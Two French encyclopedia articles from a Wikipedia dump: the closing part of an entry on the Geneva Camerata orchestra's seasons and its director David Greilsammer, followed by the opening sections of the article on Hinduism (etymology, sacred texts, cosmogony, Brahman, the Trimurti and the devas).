Au mois de novembre 2017, GECA a présenté lors de l’un de ses concerts "Prestige", « La Danse du Soleil », où les musiciens dansaient tout en jouant par cœur la Suite du Bourgeois Gentilhomme de Lully et la Symphonie n°40 de Mozart, aux côtés du chorégraphe et danseur Juan Kruz Díaz de Garaio Esnaola. Au cours de cette même soirée, les Wesendonck Lieder de Wagner ont été interprétés par la contralto Sara Mingardo.
A noter également, la présence du baryton américain Thomas Hampson, en mai 2018, qui a eu l’opportunité de chanter des airs allant de Mahler, à Porter. Durant ce même concert clôturant la cinquième saison du Geneva Camerata, l'orchestre a interprété la Symphonie "Eroica" de Beethoven, une suite issue du Malade Imaginaire de Charpentier et a donné la création mondiale d'un nouveau Concerto pour flûte et orchestre du compositeur Nicolas von Ritter-Zahony avec le flûtiste GECA, Roy Amotz.
Les concerts "Sauvage" ont parcouru une fois de plus un certain nombre d’univers avec notamment le chanteur et joueur de kora sénégalais, Sankoum Cissokho, présent aux côtés des musiciens de l’orchestre pour une manifestation explorant le monde du classique et celui des musiques africaines. Par ailleurs, le ténor Nicky Spenceet et les solistes du Geneva Camerata ont proposé un périple musical entre Broadway et des chefs-d'œuvre du Baroque, lors d'un concert nommé "Broadway, my Love...".
Enfin, le chanteur Bastien Picot et le GECA ont rendu hommage à Stevie Wonder.
Les plus petits ont quant à eux eu l'occasion de découvrir les aventures d'une petite souris à New York, lors d'un spectacle entre musique, jonglage et acrobatie. Ils ont aussi pu assister à un concert en compagnie des percussionnistes GECA dévoilant leur "Percushow!" - un Concert en "Famille" qui a fait découvrir à ce jeune public les instruments à percussion les plus prodigieux et insolites.
2017 – 2018 a marqué la sortie de l'album, nommé "Sounds of Transformation", qui avait été enregistré lors de la saison précédente. Pour l’occasion, ce disque a fait l'objet d'une grande tournée européenne de quinze dates en compagnie du pianiste jazz Yaron Herman. Construit en forme de palindrome, cet album présente un voyage musical entre les univers baroques, classiques, jazz et contemporains. Tout au long du disque, le Geneva Camerata présente, aux côtés du pianiste jazz Yaron Herman, une succession de pièces, toutes connectées par des ponts musicaux imaginatifs et inattendus. En plein cœur du programme, David Greilsammer joue et dirige le Concerto pour piano en sol de Ravel, avant que l'orchestre ne reprenne le chemin du voyage avec des pièces de Marais, Rameau, Ives, Purcell et Lully, entourés d'improvisations de Yaron Herman, de son batteur Ziv Ravitz et des musiciens de l'orchestre.
D’autre part, GECA a été sur la route des festivals et s’est produit notamment au Rheingau Musik Festival en Allemagne avec le DJ &amp; pianiste Francesco Tristano, au festival Musiques en été à Genève avec la contralto Marie-Nicole Lemieux, ainsi qu'au festival Classique au Vert, au Parc Floral à Paris, dans un programme éclectique autour de Beethoven.
Saison 2018 - 2019 / La cité des Rêves.
Entre 2018 et 2019, l'orchestre s’est produit avec les violonistes Viktoria Mullova et Gil Shaham, les violoncellistes Pieter Wispelwey, et Nicolas Altstaedt, le saxophoniste Émile Parisien, l'accordéoniste Vincent Peirani, le batteur Arthur Hnatek, ainsi qu'avec la comédienne Isabelle Adjani, le metteur en scène et chorégraphe Yoann Bourgeois, ou encore la chanteuse rock Aubrey Logan.
Cette sixième saison, surprenante et résolument tournée vers l'univers du spectacle, a débuté par la présentation d’«Ismène». Soit, une pièce musicale commandée par le GECA au compositeur Javier Muñoz Bravo et présentée en création mondiale dans une adaptation de l’œuvre de l’écrivain grec Yannis Ritsos. Cette commande de l’ensemble genevois, a été portée par la comédienne Isabelle Adjani. Durant ce concert, la soprano Patricia Petibon était également présente et a entonné des airs de Gluck (tirés d’«Armide» et d’«Iphigénie en Tauride»), d’autres de Mozart («Alma grande nobil core» puis un extrait d’«Idoménée»).
Au mois de novembre 2018, GECA a souhaité inviter le violoncelliste Nicolas Altstaedt et l'ombromane/illusionniste, Philippe Beau, pour le concert "Prestige" « Ombres Mystérieuses ».
Enfin, l’univers théâtral a été encore plus approfondi lors du spectacle "La Symphonie du Mirage", un voyage entre cataclysmes, hallucinations et transformations. Pour ce concert, les musiciens de l'orchestre ont accepté le pari de jouer par cœur la Symphonie n°7 de Beethoven tout en participant, simultanément, à une création chorégraphique, théâtrale et acrobatique du metteur en scène et chorégraphe Yoann Bourgeois. Lors de cette même soirée, GECA a aussi mis à l'honneur son clarinettiste Mathieu Steffanus, qui a interprété pour l’occasion le concerto pour clarinette de Mozart en compagnie des musiciens de l’orchestre.
Les concerts intimistes "Sauvage", ont quant à eux parcouru divers genres musicaux allant du R&amp;B au métal. Le musicien afghan Khaled Arman a également participé à l’une de ces séries de concerts, en se produisant aux côtés des Solistes du Geneva Camerata pour rendre un hommage à son pays.
Côté tournées, l'orchestre a effectué deux grandes tournées en Asie et en Amérique du Sud, et a également fait ses débuts au Théâtre des Champs-Élysées à Paris. Par ailleurs, GECA a été invité par la Nikolaisaal de Potsdam en Allemagne pour présenter le 31 décembre l'un de ses spectacles les plus originaux, "Un Cirque à l'Orchestre". D'autre part, le Geneva Camerata a présenté "La Danse du Soleil", chorégraphiée et dansée par Juan Kruz Díaz de Garaio Esnaola. Cette création, jouée à l’international, a été sacrée par le New York Times comme l'une des meilleures performances de l'année dans le monde de la musique classique. Elle a aussi été louée par la presse européenne comme "incroyable et révolutionnaire".
Fin 2018, l'album du Geneva Camerata, "Sounds of Transformation", a été sélectionné par la chaîne radiophonique new-yorkaise WQXR comme l'un des meilleurs disques de l'année.
Saison 2019 - 2020 / Dans le son de tes yeux.
Lors de la saison 2019-2020, tronquée par la pandémie mondiale du Covid-19, le Geneva Camerata est notamment monté sur scène avec la violoncelliste Alisa Weilerstein, la soprano Véronique Gens, la chanteuse de flamenco Buika, la comédienne Sophie Marceau et la chanteuse de jazz Cyrille Aimée. Les représentations prévues avec la violoniste Isabelle Faust, les danseurs et chorégraphes Marie-Claude Pietragalla et Julien Derouault, ainsi qu’avec les saxophonistes Joshua Redman et Émile Parisien ont été reportées à la saison 2020/2021.
La septième saison a débuté par la rencontre singulière, lors du "Concert Prestige n°1," entre l’orchestre genevois et Buika, chanteuse espagnole d’origine équatoguinéene de flamenco. Lors de cette même soirée, le "Concerto pour violoncelle" "en si mineur" d’AntonÍn Dvorák a été interprété par la violoncelliste américaine Alisa Weilerstein.
Fin novembre, l’orchestre genevois a dévoilé en création mondiale, lors du "Concert Prestige n°2", une pièce intitulée « Stabat Mater Furiosa ». Basée sur le poème dramatique de l’écrivain français Jean-Pierre Siméon, cette pièce a été conçue par la compositrice colombienne Violeta Cruz. Cette commande a été interprétée sur scène par la comédienne française Sophie Marceau.
Le confinement du printemps 2020 ne permettant pas la tenue de manifestations, plusieurs concerts, dont les "Prestige" "n°4" et "n°5", ont été reportés à la saison 2020/2021, tout comme le concert prévu à Tel-Aviv.
Du côté des "Concerts" "Sauvages", l’orchestre a débuté par un spectacle intitulé « Rêves d’Arménie ». Sur scène, le virtuose du duduk Levon Chatikyan, le pianiste jazz Marc Perrenoud ainsi que quelques solistes de l’orchestre genevois ont proposé un concert mêlant musique folklorique d’Arménie, jazz, baroque et improvisation. Le deuxième concert de la série, « Nirvana Forever », rendait hommage au groupe de grunge britannique Nirvana et a été objet de plusieurs représentations.
Lors de cette saison 19/20, GECA a réalisé une tournée automnale européenne conclue à New York, au 92Y, afin de présenter son spectacle « La Danse du Soleil », chorégraphié et dansé par Juan Kruz Díaz de Garaio Esnaola. L’orchestre a poursuivi sa tournée au printemps en jouant notamment dans une salle complète à la Scala, à Paris.
Discographie.
Loué par la presse internationale, le premier album du Geneva Camerata, "Sounds of Transformation", est paru en 2018 chez Sony Classical. Le GECA et David Greilsammer s’associent à Yaron Herman, pianiste virtuose franco-israélien à la vision musicale transversale, pour donner forme à ce « Sounds of Transformation », un programme embrassant non seulement le classique et le jazz, mais également le blues et l’improvisation. Construit sous la forme d’un palindrome, ce programme résolument atypique (d’une durée de 70 minutes) propose aux auditeurs d’embarquer pour une traversée palpitante d’un monde musical à l’autre.
David Greilsammer: directeur musical et artistique.
Sacré « Révélation » aux Victoires de la Musique et distingué à cinq reprises par le "New York Times", David Greilsammer est reconnu comme l’un des artistes les plus audacieux de sa génération. Chef d’orchestre et pianiste, il porte une affection particulière aux projets innovants, à la création contemporaine et aux passerelles entre les arts.
En 2012 et en 2013, le "New York Times" a choisi les albums Baroque Conversations et "Mozart In-Between" de David Greilsammer parmi les meilleurs disques de l’année. Son dernier disque en solo chez Sony Classical, qui présente une rencontre insolite entre les sonates de Domenico Scarlatti et de John Cage, a également été primé par de nombreux prix internationaux.
Depuis de longues années, David Greilsammer est reconnu pour ses interprétations des œuvres de Mozart, un compositeur auquel il a consacré plusieurs albums. À Paris, David Greilsammer crée l'événement en interprétant en une journée « marathon » l’intégrale des sonates pour piano, et plus récemment en dirigeant du piano les vingt-sept concertos de Mozart en une seule saison.
Directeur musical et artistique du Geneva Camerata, David Greilsammer s’est récemment produit comme chef et comme soliste avec le BBC Philharmonic Orchestra, l’Orchestre Symphonique de San Francisco, le Philharmonique de Radio France, le Tokyo Metropolitan Symphony, l’Orchestre du Mozarteum de Salzbourg, le Hong Kong Sinfonietta, l’Orchestre National du Mexique et l'Orchestre Symphonique de Hambourg.
Ses récitals en solo, présentant toujours des programmes éclectiques et novateurs, ont été donnés récemment au Concertgebouw d’Amsterdam, au Mostly Mozart Festival et au Lincoln Center de New York, au Kennedy Center de Washington, au Wigmore Hall de Londres, au Verbier Festival, à la Salle Flagey à Bruxelles, au Suntory Hall de Tokyo et au Théâtre de la Cité Interdite à Pékin. Donné en création mondiale à New York cette saison, son nouveau récital, nommé Labyrinthe, a été décrit par la presse américaine comme « fascinant et courageux ».
Artistes invités.
Parmi les artistes collaborant avec la formation, figurent :

</doc>

<doc id="1409" url="https://fr.wikipedia.org/wiki?curid=1409" title="Hindouisme">
Hindouisme

Lhindouisme, parfois écrit indouisme (en hindi : , ' ; en tamoul : ; « religion hindoue »), ou sanatana dharma (en sanskrit : , ' : « loi éternelle »), est l'une des plus anciennes religions du monde encore pratiquées qui n'a ni fondateur, ni dogme imposé, ni institution cléricale organisée uniformément (les brahmanes peuvent être de différentes écoles). « On appelle communément religion hindoue (ou hindouisme), le courant spirituel qui naît de la Bhagavad-Gita et dont le bhakti-yoga, la voie de la dévotion, est le trait le plus saillant. (…) Celle-ci [la religion] a des antécédents et véhicule des éléments hérités de religions antérieurement vivantes dont elle utilise, à la fois largement et librement, la symbolique, le fonds doctrinal, les pratiques sacrificielles, éventuellement la langue, la terminologie, le panthéon, etc.. » 
En 2015 le nombre de fidèles est estimé à 1,1 milliard, répartis dans 85 pays. L'hindouisme est actuellement la troisième religion la plus pratiquée dans le monde après le christianisme et l'islam. Il est issu du sous-continent indien, qui reste son principal foyer de peuplement.
Le terme persan" hindu" (du sanskrit "Sindhu") désignait au départ, pour les musulmans qui pénétrèrent en Inde, les habitants du bassin de l'Indus.
La majorité des hindous ont foi en l'autorité du Veda, considéré comme « permanent » ("nitya"), qui fut révélé aux êtres humains de façon « non humaine » (अपौरुषेय, "apauruṣeya") par Brahmā et grâce à l'« audition » des Rishi (c'est-à-dire les « Sages ») ; c'est l'avis des traditions brahmaniques comme le Vedanta et la Mîmâmsâ, mais pas des écoles philosophiques brahmaniques Nyâya et Vaisheshika qui reconnaissent l'autorité du Véda tout en le considérant "anitya" (« impermanent ») et "paurusheya" (« humain »). Les auteurs de textes védiques ne sont pas tous identifiés, ou bien le sont de façon légendaire comme Vyāsa.
L'hindouisme se présente comme un ensemble de concepts philosophiques, politiques, scientifiques et artistiques issus d'une tradition remontant à la protohistoire indienne, la pratique hindouiste provenant sans doute d'une tradition orale très ancienne, proche de l'animisme. On retient parfois une tripartition historique qui fait de l'hindouisme la dernière phase du développement des religions en Inde, après le védisme (env. 1500-500 avant notre ère) et le brahmanisme (-600 à 500 de l'ère courante).
Au-delà du syncrétisme théologique, l'hindouisme d'avant l'islam et le colonialisme européen qui soumirent l'Inde à leur autorité était un vecteur de toutes les sciences de son époque : le droit, la politique, l'architecture, l'astronomie, la philosophie, la médecine ayurvédique et d'autres savoirs qui avaient en commun le substrat religieux.
Étymologie.
"Hindū", ou "hindou", est le nom persan désignant le fleuve Indus, d'abord rencontré dans l'ancien persan, correspondant au mot védique sanskrit "sindhu" : « cours d'eau », devenu nom propre de . Le Rig-Véda mentionne la terre des peuples indo-aryens comme le "sapta sindhu" (« sept cours d'eau », ), qui correspond à "hapta həndu" dans l'Avesta ("Vendidad" ou "Videvdad" 1.18) . Le terme était utilisé par les hommes vivant à l'ouest de l'Indus, pour nommer les peuples qui habitaient à l'est du fleuve, dans le sous-continent indien ; c'est aussi l'étymologie des noms , sindhi et Sinti. Dans l'islam, le terme arabe se réfère également au sous-continent indien à l'est de l'Indus.
Le terme persan ancien "Hindūk", en persan moderne "Hindū", fit son entrée avec l'expansion de l'islam, notamment pour désigner les habitants autochtones du sultanat de Delhi et apparaît aussi en Inde du Sud et dans des textes cachemiris à partir de 1323, puis il devient commun sous la colonisation britannique pour désigner un indigène du Raj britannique, toutes religions confondues (ce sens durera en français jusqu'au ). En conséquence, le terme « hindou » est un exonyme : il ne vient pas des peuples « hindouistes » eux-mêmes, bien qu'il ait fini par être adopté et assimilé par eux.
Depuis la fin du , le mot a été utilisé comme un terme général pour le corpus majoritaire des traditions religieuses, spirituelles et philosophiques d'origine indienne du sous-continent, pour les distinguer de l'islam, du christianisme, du judaïsme, du sikhisme, du bouddhisme ou du jaïnisme. Dans ce sens, un "hindou" est une personne qui partage la philosophie exposée dans les Vedas, nommée "Upanishad" (le mot "Veda" peut être traduit par « connaissance ») et qui accepte l'autorité spirituelle et rituelle de ceux qui s'en font les interprètes.
Le terme "Hindou" a été introduit dans le monde occidental par le biais de la langue anglaise. Le terme « hindouisme » est apparu au début du . En France, on utilisait auparavant les termes « brahmanisme », « religion brahmane » ou « religion des brahmanes ».
L'hindouisme ou "sanâtana dharma" (« ordre socio-cosmique éternel ») s'apparente davantage à un substrat culturel, un mode de vie ou de pensée, qu’à une religion organisée et dogmatique. Ce qu'on appelle « hindouisme » aujourd'hui est la tentative de rassembler les croyances disparates issues de l'ancien panthéon védique, éclipsé par la popularité de Shiva, de Vishnou ou de Krishna.
Dans certains cercles aryanistes, l'hindouisme est appelé « religion aryenne », de l'expression sanskrite "arya dharma" qui signifie « noble religion » ou « religion des nobles » ; en dehors de ces cercles parfois nationalistes, voire protochronistes, le terme le plus usité est "vaidika dharma" signifiant « religion védique » ou « religion des Védas ».
Histoire.
La civilisation de la vallée de l'Indus, datant de l'âge du bronze, présente des éléments comparables à ceux de l'hindouisme, tels que les bains, les symboles phalliques comparés au Shiva lingam ainsi que des svastikas. Un sceau découvert sur le site de Mohenjo-daro est parfois considéré comme une représentation d'un proto-Shiva, mais cette interprétation n'est pas reconnue par toute la communauté scientifique. D'une façon générale, la nature exacte des relations entre la religion de la civilisation de la vallée de l'Indus et l'hindouisme reste conjecturale.
C'est durant la période védique, à l'âge de fer, entre 1500 et 600 , que les quatre Védas qui constituent les textes fondateurs de l'hindouisme sont composés. Les rites principaux du védisme concernent le yajña, le sacrifice védique en l'honneur des deva. Plusieurs divinités du Rig-Veda ont été ensuite reprises ou révisées par l'hindouisme.
Au Moyen Âge, l'hindouisme, par le biais du théisme, trouve un nouvel essor. L'hindouisme que l'on connaît aujourd'hui est principalement issu de ce nouveau courant qui a profité du déclin du bouddhisme des .
Au , l'hindouisme se répand hors de l'Inde et en particulier en Occident. Vivekananda en fait une première présentation en 1893 au Parlement mondial des religions à Chicago.
Textes sacrés.
Les textes sacrés de l’Inde antique relatifs à l'hindouisme se classent grossièrement en deux catégories.
Śruti.
Les Védas sont les textes les plus anciens qui nous soient parvenus en langues indo-européennes. Ils sont considérés par les hindous comme faisant partie de la Śruti (connaissance révélée). La tradition déclare qu'ils furent directement révélés par le Brahman aux rishis alors que ces derniers étaient en méditation profonde. Les hymnes des Védas ont été transmis oralement de père en fils et de professeur à disciple. Par la suite, ces hymnes ont été compilés par un sage appelé Vyāsa (littéralement « le compilateur », bien que le nom puisse avoir désigné un groupe personnifié pour les besoins de la tradition) ou encore Vedavyāsa (« diffuseur des Védas »).
Les textes les plus anciens sont formés des quatre "Saṃhitā", ou recueils constituant les quatre Veda, à savoir: le Ṛgveda ou « Veda des strophes », le Yajurveda ou « Veda des formules », le Sāmaveda ou « Veda des mélodies » et l’Atharvaveda à caractère magique. Le Ṛgveda contient des mantras pour invoquer les devas pour les rites de feu-sacrifice ; le Sāmaveda est le cantique, avec des notations musicales ; le Yajurveda a de véritables instructions pour les sacrifices ; et l'Atharvaveda comprend des charmes philosophiques et demi-magiques ("sic") , les sorciers, les maladies et les erreurs pendant le rite sacrifiant. À ces quatre Védas ont succédé les Brāhmaṇās qui sont des interprétations sur le Brahman, les Āraṇyaka ou « Traités forestiers » à réciter loin des agglomérations et les Upaniṣad ou « Approches » à caractère spéculatif qui ont pour seule matière la métaphysique. Les upaniṣad qui font partie de la Śruti clôturent le canon védique.
Du fait d'une conception énigmatique de la vérité par le Veda, les vérités védiques peuvent être exprimées sous forme d'« incertitudes positives » et de « vérités ultimes à mode interrogatif », comme dans l'hymne du "Rigveda-Samhitâ" (X.129) : .
Smriti : textes hindous post-védiques.
Les Vedas sont désignés sous le nom de "Shruti" (« ce qui est révélé »). Les textes plus récents sont appelés "Smriti" (« ce qui est rappelé », ou mémoire/tradition). Tandis que la littérature "shruti" est composée en sanskrit védique, les textes "smriti" le sont en sanskrit classique (plus facile) et, pour certains, en "prâkrit" ou langue commune. Puisqu’elle est accessible à tous, la littérature "smriti" a connu une grande popularité dans toutes les couches de la société indienne, et ce, dès le début. Aujourd’hui même, la plus grande partie du monde hindou est plus familière avec le "smriti" qu’avec la littérature "shruti" réservée (tardivement) à la caste dominante des brahmanes. La "smriti" correspond ainsi à la littérature populaire et, en tant que telle, elle est théoriquement moins ardue que la "shruti" (la "shruti", remontant à l'aube de l'Inde c'est-à-dire à l'époque védique, est aujourd'hui, du fait de son langage et de son vocabulaire, sujette à interprétation). La "smriti" (collection de 36 textes selon Paithina) est le pendant populaire de la "shruti" : à travers l'histoire des dieux et des héros, elle instruit sur la pensée indienne. Les textes révélés, ou "Shrutis", font autorité sur les textes mythologiques, ou "Smritis", et cela indépendamment du sujet traité. La majorité des livres de la "Smriti" font référence aux textes sacrés des Vedas ; leur but est de décoder les messages ancestraux et de les enseigner à la population. Cette seconde littérature n'est pas pour autant de moindre valeur, elle est au contraire fort riche et offre des dialogues philosophiques très poussés.
La littérature "smriti" inclut :
La philosophie hindoue décrite dans les épopées et les Puranas est centrée d'abord sur la doctrine de l’avatar (incarnation, partielle ou totale, d'un dieu en être humain). Les deux avatars principaux de Vishnou qui apparaissent dans les épopées sont Râma, le héros du Râmâyana, et Krishna, le protagoniste majeur du Mahâbhârata. À la différence des "deva" de la "Samhitâ" védique et du concept abstrait de Brahman issu des Upaniṣad (qui décrivent le divin comme étant omniprésent, impersonnel et sans forme), les avatars de ces épopées sont des intermédiaires humains entre l’Être suprême et les mortels qui offrent une vision du divin plus accessible. Dieu y est décrit comme personnel et proche de sa création (dans le "Bhagavata Purana", Krishna est un pâtre, sa création est son troupeau, le souffle traversant sa flûte est l'âme sans début ni fin des créatures).
Cette doctrine a eu un grand impact sur la vie religieuse hindoue, parce qu’elle montre que Dieu s’est manifesté sous une forme qui peut être appréciée même par le plus modeste des hommes. "Râma" et "Krishna" sont depuis des milliers d’années des manifestations du divin, aimées et adorées des hindous. Le concept du "brahman" des "Upanishad" est assurément le pinacle de la pensée religieuse indienne, mais la vision des avatars et le récit de leurs mythes ont certainement eu plus d’influence sur l’hindou moyen. Les hindous attachent plus d'importance à l'éthique et aux sens métaphoriques transmis par ces textes qu'à la mythologie littérale.
Cosmogonie et divinités.
Selon la mesure védique du temps, qui s'étend sur plusieurs milliards d'années, l'univers connaît des périodes d'expansion (kalpa ou jour de Brahmâ, équivalent à 1000 mahayuga, soit 4,32 milliards d'années), puis d'anéantissement (pralaya ou nuit de Brahmâ, de même durée). Un mahayuga est composé de 4 yuga, dont le dernier, actuel, est le kaliyuga, « âge de fer » ou « âge des conflits », dénommé ainsi car c'est une période matérialiste et décadente par rapport à l'âge d'or de l'humanité (kritayuga).
La cosmogonie hindoue enseigne que le principe de toute vie, de tout progrès, de toute énergie, réside dans les différences, les contrastes. .
La cosmogonie hindoue est la théorie hindouiste de la création de l'univers et de son image. Celle-ci est caractérisée par un recours constant au chiffre 7.
Le monde a été créé en forme d'œuf (l'« œuf d'or de Brahmâ », "hiranyagarbha" en sanskrit). La moitié supérieure de l'œuf cosmique ("brahmāṇḍa") se divise en sept zones : les trois premières, terre, air et ciel, forment ensemble le "triloka" (« trois mondes ») et sont surmontées par quatre régions célestes constituant la demeure des dieux. La moitié inférieure de l'œuf cosmique comprend sept régions infernales ("pātāla"), qui forment des étages et sont habitées par des démons et des serpents. Au dessous de l'œuf cosmique se trouve l'Océan primitif, formé par sept autres zones infernales. La Terre est divisée en sept continents entourés de sept mers.
Brahman.
Le Brahman (prononcé /brəh mən/) est un concept provenant à l'origine des Védas. C'est l'indescriptible, le neutre, l'inépuisable, l'omniscient, l'omniprésent, l'original, l'existence infinie, l'Absolu transcendant "et" immanent (cf. panenthéisme), l'Éternel, l'Être, et le principe ultime qui est sans commencement et sans fin, – dans l'univers entier. C'est la Réalité Ultime, l'Âme Absolue ou Universelle ("Paramatman"), l'Un. Il ne doit pas être confondu avec la divinité Brahmâ ou le nom des prêtres hindous, les brâhmanes.
De nombreuses "Upanishad" font référence au rapport qu'entretient le Brahman (âme universelle) avec l"'âtman" (essence de toute créature), dont la vision est considérée comme libératrice, car menant celui qui en a la connaissance à ne plus s'identifier à son ego transitoire dans ses actes ("karma") :
Cet Absolu, que les hindous désignent aussi par le nom de "tat" en sanscrit (« Cela »), est par sa nature même impossible à représenter. L'Absolu est tantôt manifesté : "Tat Tvam Asi" (तत्त्वमसि : Tu es Cela), ou « Tout cela est "Brahman" » disent les textes sacrés, tantôt non-manifesté : « le "Brahman" est Vérité, le monde est Illusion », disent aussi les textes sacrés.
Il est parfois évoqué un "Brahman supérieur", le "Parabrahman". Le "Brahman" peut en effet être considéré sans attributs personnels, sans forme ("Nirguna Brahman"), d'une façon totalement abstraite, ou avec des attributs, avec une forme, au travers de la multitude des divinités ("Saguna Brahman").
Certains courants de l'hindouisme peuvent être considérés comme panthéistes, d'autres comme panenthéistes.
La tradition brahmanique comprend l'Absolu ("Brahman", l'Âme universelle, la Réalité infinie, la Divinité suprême dotée ou non d'attributs et de formes) comme étant l'Un (sans second), que l'on peut concevoir de différentes façons : soit en privilégiant une divinité particulière considérée comme supérieure aux autres (sans nier les autres pour autant), c'est-à-dire par une attitude relevant de l'hénothéisme, ou soit en concevant chaque divinité comme un membre "vénérable" de l’Absolu ; toutes les divinités, différentes et prises séparément, sont chacune une fenêtre distincte ouverte sur le paysage divin : et toutes ces fenêtres ouvertes réunies sur l’Absolu ("Brahman") constituent effectivement l’Absolu, l’Âme cosmique, c'est-à-dire par une attitude liée au polythéisme (le Divin est Multiple). Quoi qu'il en soit, le Brahman est omniprésent sans pour autant être confondu avec les choses limitées et transitoires qui composent le monde :
Trimūrti.
La nature du Brahman ne l'empêche pas de se manifester sous la forme d'un dieu personnel. L'hindouisme, selon les courants religieux, donne divers noms au dieu personnel. Un nom général existe cependant, celui d"'Ishvara" (« le Seigneur Suprême »), terme surtout philosophique car, dans la pratique du culte et de la vie quotidienne, on ne s'adresse guère qu'à l'un des membres de la Trimurti : (Shiva, Vishnou, ou, plus rarement, Brahmâ, car ce dernier, en créant les créatures vivantes, a engendré le "samsara", cycle des réincarnations que l'on doit abandonner, « opposé » à Moksha, la libération).
Les dieux personnels majeurs sont ceux de la "Trimūrti". Ce sont dans l'ordre Brahmâ, Vishnou et Shiva, qui correspondent à l'action respectivement créatrice, conservatrice et destructrice de l'Absolu transcendant (Brahman). Ils représentent trois aspects inséparables de la structure de l'Univers.
Dans les manifestations personnelles (divinités) du dieu impersonnel (Brahman), l'hindouisme est une religion polythéiste ; à ce titre, cette religion comporte une variété et une diversité de 330 millions de divinités (le chiffre est parfois considéré comme symbolique, du même nombre que celui des êtres vivants, selon l'idée que Dieu vit dans le cœur de tout être vivant, en tant que "Sarvanetradhivasa", « Celui qui est présent dans les yeux de tous les êtres ») .
L'hindou peut vénérer le "Brahman" sous la forme d'une divinité de son choix, sans pour autant rejeter l'existence d'autres divinités, considérant Ganesh, par exemple, comme l'incarnation suprême du "Brahman" (cet hindou sera un "ganapatya", et shivaïte) : dans ce cas, l'hindouisme est un hénothéisme. Néanmoins, selon cet aphorisme du "Brahmanoûtchîntamam" :
Dans l'hindouisme, il n'y a pas de conflit entre polythéisme et monothéisme : la religion, la philosophie et les théories qui les accompagnent ne sont que des chemins qui tentent de décrire le "Brahman" (« Âme universelle ») au-delà duquel il n'y a plus rien, et la manière de se fondre en lui.
Depuis Georges Dumézil qui a mis en lumière la fonction triadique dans les civilisations indo-européennes, un parallèle formel entre la trimurti et la trinité chrétienne peut être établi (ce qui n'induit pas un rapprochement théologique entre les traditions chrétiennes et hindoues) : en effet, dans le panthéon hindou, on représente la divinité comme triple. On appelle ce principe la trimurti : Brahma, Vishnu et Shiva sont trois aspects du divin. Brahma désigne symboliquement le créateur (le démiurge), Vishnu représente le conservateur et Shiva représente le destructeur dans le cycle de l'existence. Cette triple Nature se rapprocherait de l'énoncé de l'européen médiéval : "spiritus", "anima", "corpus". Un tel rapprochement entre Trinité chrétienne et Trimūrti a été notamment effectué par l'indianiste Alain Daniélou (à ne pas confondre avec son frère le théologien Jean Daniélou) dans "Mythes et dieux de l'Inde", mais il a été ultérieurement critiqué par d'autres spécialistes (voir l'article Trimūrti pour plus d'informations).
L'hindouisme est une religion dont les diverses divinités sont considérées comme les formes différentes d'une même expression divine sous-tendue par une réalité ultime. La question sur la nature exacte de cette dernière (immanente ou transcendante, personnelle ou impersonnelle) dépend des courants. Selon Ananda Coomaraswamy, le culte des puissances de la nature dans l'hindouisme doit être compris dans le sens de "natura naturans est deus" : « lesdites puissances ne sont que les noms des actes divins ». Depuis la "Chandogya" Upaniṣad, cette philosophie de l'unité divine est devenue très importante dans la littérature sacrée. Le mantra "Tat Tvam Asi" (तत्त्वमसि : Tu Es Cela) célèbre cette unité de la création avec son créateur, qu'il soit personnel ou impersonnel. Un épisode du Srimad Bhagavatam met en avant cette réalité : le dieu Krishna, avatar de Vishnu, demande aux habitants de Vrindavan d'abandonner le culte d'Indra pour le sien, puisque Krishna se présente comme le Dieu suprême dont Indra n'est qu'un fragment.
Divinités majeures et mineures.
 
Les diverses incarnations (ou « descentes », avatars) de la Trimurti (Krishna est un avatar de Vishnou) sont des divinités majeures. Les divinités mineures sont des créations ou des procréations des divinités majeures. Ganesh, qui est une divinité importante dans l'hindouisme, est lié à Shiva en tant que procréation ou création selon les mythes développés à son sujet.
Dévas.
La religion hindoue croit en l'existence d'entités célestes appelées "devas" (ou "dévas").
Le féminin de "deva" est "devî" (ou "dévî"). La question de la nature de ces "devas" consiste en ces trois points :
Dans la "Brihadaranyaka Upanishad" (III.IX.1 à 9), Shakala demande au sage Yajnavalkya quel est le nombre exact de dieux ("deva") ; celui-ci répond : « trois cent trois et trois mille trois » (autant que mentionnés dans le groupe de mantras du Veda nommé "Nivid" des "Vishvadeva —" ce sont les « manifestations de la grandeur des dieux ») ; mais Shakala réitère la même question et Yajnavalkya répond : « trente-trois » (les huit Vasus, les onze Rudras, les douze Adityas, Indra et Prajapati) ; Shakala recommence à poser encore et encore la même question pour connaître le nombre exact de dieux et Yajnavalkya répond : « six » (le feu, la terre, l'air, l'espace atmosphérique, le soleil et l'espace céleste), puis « trois » (les trois mondes, "triloka"), « deux » (la nourriture et l'énergie vitale), « un et demi » (« le souffle de vie, qui circule partout ») pour en arriver à « un » : le dieu unique « est le souffle vital, et on le nomme Brahman, le lointain ("tyat") ».
Quelle que soit la nature des "devas" (aussi appelés "dévatâs"), ils sont une partie intégrante de la culture hindoue. Les 33 "devas" védiques incluent "Indra", "Agni", "Soma", "Varuna", "Mitra", "Rudra", "Prajâpati", "Vishnu", "Aryaman" et les "Ashvins" ; les "devîs" importantes étaient "Sarasvatî", "Ûshâ" et "Prithivi". "Indra" est le roi des dieux (Vishnou, pour un vishnouite, est le Dieu des dieux).
Bien que la mythologie hindoue mentionne plusieurs classes d'êtres démoniaques (les rakshasas, les "daityas", les "dânavas", les "pishâchas" ou les non-dieux, les asuras), opposés aux esprits célestes (appelés devas), "Gandarvas", "Vidyadharas", elle ne croit pas au concept du Mal. « Les oppositions, dualités, polarités, sur lesquelles insiste tant l'hindouisme, ne sont pas constituées par des entités indépendantes, fixes, aux caractères immuables et contradictoires telles que le christianisme populaire se représente Dieu et le Diable. » Cela signifie que le mal dans le monde n'est pas attribué à une force supérieure, mais à l'ignorance humaine et il est donc comme une conséquence possible du libre arbitre et de la Nature. La mythologie indienne n'oppose pas le "Bien" contre le "Mal" : les batailles sont celles de classes d'êtres contre d'autres, d'une idée contre une autre, d'où les plus nobles sortent victorieuses.
On trouve parmi les dévas les lokapālas (les divinités du védisme recyclées dans le panthéon du "sanatana dharma"), les navagrahas (les neuf planètes de l'astrologie indienne).
Syllabe sacrée OM.
"Om" (ou "Aum") est un des symboles sacrés de l'hindouisme. C'est le son primordial qui surgit du chaos avant la Création, il est la source de l'existence.
Il est utilisé comme préfixe et parfois comme suffixe aux mantras. Il représente la contraction des trois qualités cosmiques ("gunas") : "Sattva", "Tamas" et "Rajas", et représente l'univers.
Écrit « Om », il est la contraction de « Aum », « m » étant la résonance et « o », la vibration originale.
Le son Ôm (ou Aum, ॐ) est empli d'un message symbolique profond : il est considéré comme la vibration primitive divine de l'Univers qui représente toute existence, entourant toute nature dans une Vérité ultime.
